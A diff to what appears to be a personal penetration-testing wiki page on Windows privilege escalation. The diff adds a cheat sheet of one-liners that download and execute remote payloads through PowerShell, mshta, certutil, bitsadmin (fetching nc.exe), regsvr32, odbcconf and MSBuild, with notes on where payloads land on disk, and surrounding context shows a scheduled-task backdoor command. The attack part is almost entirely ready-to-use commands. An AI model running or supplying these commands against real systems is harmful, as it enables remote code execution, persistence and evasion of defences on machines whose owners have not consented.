@@ -2,7 +2,7 @@
 title: Windows Privilege Escalation
 description: 
 published: true
-date: 2021-08-09T15:06:05.696Z
+date: 2021-08-10T06:42:42.230Z
 tags: 
 editor: markdown
 dateCreated: 2021-08-09T14:37:30.092Z
@@ -52,6 +52,46 @@ https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388
 
 Persistent back door
 schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.exe
+
+## Download Payload & execute in Memory
+powershell -exec bypass -c “(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(‘http://webserver/payload.ps1’)|iex”
+
+mshta vbscript:Close(Execute(“GetObject(“”script:http://webserver/payload.sct””)”))
+mshta \\webdavserver\folder\payload.hta
+mshta http://webserver/payload.hta
+Payload written on disk: IE local cache
+
+wmic os get /format:”https://webserver/payload.xsl
+
+certutil -urlcache -split -f http://webserver/payload payload
+
+bitsadmin /rawreturn /transfer getpayload http://IP/nc.exe nc.exe
+
+cmd.exe /k < \\webdavserver\folder\batchfile.txt
+
+cscript //E:jscript \\webdavserver\folder\payload.txt
+Payload written on disk: WebDAV client local cache
+
+regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
+regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
+Payload written on disk: IE local cache
+
+odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
+Payload written on disk: WebDAV client local cache
+
+cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
+Payload written on disk: WebDAV client local cache
+
+> IE local cache
+> C:\Users\<username>\AppData\Local\Microsoft\Windows\Temporary Internet Files\
+> C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE\<subdir>
+> 
+> UNC Path pointing to WebDAV / WebDAV client local cache:
+> C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV
+{.is-info}
+
+
+Source: https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/
 
 ## Applocker bypass - Poor man's method
 **Check for write/execute permission**
